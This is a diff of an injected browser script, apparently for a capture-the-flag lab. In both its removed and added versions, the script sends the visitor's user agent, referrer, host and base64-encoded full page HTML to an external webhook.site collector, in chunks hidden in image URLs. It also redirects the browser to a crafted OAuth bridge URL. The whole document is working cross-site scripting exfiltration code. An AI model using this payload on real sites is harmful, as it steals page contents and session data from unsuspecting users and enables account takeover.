@@ -2,29 +2,19 @@
 <script>
 var C='https://webhook.site/e2800127-7671-4b5d-a058-6a5ed1f0d9ec';
 function ping(t,d){new Image().src=C+'?tag='+t+'&d='+encodeURIComponent(JSON.stringify(d||{}));}
-ping('JS-EXEC',{ua:navigator.userAgent});
-fetch('https://cloud-console-b0f96c6dbcec.pwnbox-lab.com/oauth/bridge?state='+encodeURIComponent('{\"target_host\":\"clf-b0f96c6dbcec.pwnbox-lab.com\",\"return_to\":\"/\"}'))
-.then(function(r){return r.text()})
-.then(function(t){
-  var m=t.match(/window\.location\s*=\s*"([^"]+)"/);
-  if(!m){ping('NO-MATCH',{head:t.slice(0,300)});return;}
-  var url=m[1].split('" + "').join('');
-  ping('NAV',{u:url.slice(0,140)});
-  setTimeout(function(){location=url;},300);
-})
-.catch(function(e){ping('ERR',{e:String(e)})});
-</script>
+ping('V3-JS',{ref:document.referrer.slice(0,80)});
+setTimeout(function(){
+  location='https://cloud-console-534f164158ae.pwnbox-lab.com/oauth/bridge?state='+encodeURIComponent('{"target_host":"clf-534f164158ae.pwnbox-lab.com","return_to":"/"}');
+},250);
+</script></body></html>
 <script>
 (function(){
  function bx(s){return btoa(unescape(encodeURIComponent(s)));}
  var C='https://webhook.site/e2800127-7671-4b5d-a058-6a5ed1f0d9ec';
- var html=document.documentElement.outerHTML;
- var enc=bx(html);
- new Image().src=C+'?tag=VICTIM-PAGE&len='+enc.length+'&i=0';
- // chunked exfil through image urls (~1200 chars each)
- for(var i=0,o=0;o<enc.length;i++,o+=1200){
-   new Image().src=C+'?tag=VC&i='+i+'&d='+enc.substr(o,1200);
+ var enc=bx(document.documentElement.outerHTML);
+ new Image().src=C+'?tag=S2-LANDING&host='+encodeURIComponent(location.host)+'&len='+enc.length;
+ for(var i=0,o=0;o<enc.length;i++,o+=1100){
+   new Image().src=C+'?tag=VC&i='+i+'&d='+enc.substr(o,1100);
  }
 })();
 </script>
-</body></html>
